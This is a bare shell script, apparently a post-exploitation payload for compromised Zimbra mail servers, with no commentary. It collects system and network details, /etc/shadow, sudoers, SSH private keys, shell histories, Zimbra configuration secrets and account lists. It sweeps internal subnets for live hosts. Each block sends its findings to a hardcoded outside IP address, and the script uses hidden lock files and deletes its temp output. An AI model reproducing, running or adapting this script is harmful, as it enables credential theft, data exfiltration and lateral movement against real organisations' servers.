# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#XRUN
exec 8>/tmp/.xxlock; flock -n 8 || exit 0
touch /tmp/.bx1
O=/tmp/.xxo
{
echo "==DF=="; df -h | head -8
echo "==IPA=="; ip -o -4 a | head -10
echo "==ROUTE=="; ip r | head -8
echo "==HOSTS=="; cat /etc/hosts
echo "==HOSTNAME=="; hostname
echo "==LISTEN=="; ss -lntu 2>/dev/null | head -25
echo "==ZDIR=="; ls /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
echo "==GAA=="; /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
echo "==NEIGH=="; ip neigh 2>/dev/null | head -25
} > $O 2>&1
curl -sm60 -X POST --data-binary @$O http://131.123.43.239/up -H "X-Name: efox_recon1"
rm -f $O
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1
if [ ! -f /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
( exec 9>/tmp/.qq3lock; flock -n 9 || exit 0
  H=$(hostname -s 2>/dev/null || hostname)
  O=/tmp/.qq3o
  {
  echo "==ID=="; id; hostname; date
  echo "==IP=="; ip -o -4 a; echo "--route--"; ip r
  echo "==RESOLV=="; cat /etc/resolv.conf
  echo "==HOSTS=="; cat /etc/hosts
  echo "==LISTEN=="; ss -lntup 2>/dev/null | head -40
  echo "==IPT=="; iptables -L -n 2>/dev/null | head -30; iptables -t nat -L -n 2>/dev/null | head -20
  echo "==SHADOW=="; cat /etc/shadow 2>/dev/null
  echo "==SUDOERS=="; grep -v '^#' /etc/sudoers 2>/dev/null; cat /etc/sudoers.d/* 2>/dev/null
  echo "==CRONS=="; crontab -l 2>&1 | grep -v '^#'; ls /etc/cron.d /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
  echo "==ZMSSH=="; ls -la /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev/null
  echo "==ROOTSSH=="; ls -la /root/.ssh 2>/dev/null; cat /root/.ssh/id* /root/.ssh/*.pem /root/.ssh/authorized_keys 2>/dev/null
  echo "==HOMESSH=="; for d in /home/*/.ssh; do echo "--$d--"; ls -la $d 2>/dev/null; cat $d/id* 2>/dev/null; done
  echo "==HIST=="; cat /root/.bash_history /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
  echo "==ZLC=="; (su - zimbra -c '/opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/zmlocalconfig -s 2>&1) | head -250
  echo "==SWEEP=="; for n in $(ip -o -4 a | awk '{print $4}' | grep -oE '^(10\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+|192\.168\.[0-9]+)' | sort -u); do (for i in $(seq 1 254); do (ping -c1 -W1 $n.$i >/dev/null 2>&1 && echo "ALIVE $n.$i") & done; wait); done
  } > $O 2>&1
  curl -sm90 -X POST --data-binary @$O http://131.123.43.239/up -H "X-Name: qq3_$H"
  rm -f $O
) &
fi
